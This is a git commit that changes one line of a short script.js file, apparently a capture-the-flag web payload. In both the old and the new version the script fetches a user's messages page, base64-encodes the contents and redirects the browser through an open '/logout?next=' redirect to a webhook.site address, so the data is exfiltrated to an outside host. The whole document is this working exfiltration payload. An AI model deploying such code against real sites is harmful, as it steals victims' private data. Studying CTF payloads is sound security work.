745641b1b4924fdd830ac48b1c7a642d79044cdd
NtCreateThreadEx <56292678+NtCreateThreadEx@users.noreply.github.com>
2025-10-03 13:15:56 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,4 +1,4 @@
-fetch('/messages?id=1')
+fetch('/messages?id=0')
   .then(function(r) { return r.text(); })
   .then(function(data) {
     location = '/logout?next=https://webhook.site/e29717d0-ddb3-4301-85fa-834f8a8ba029?flag=' + btoa(data);
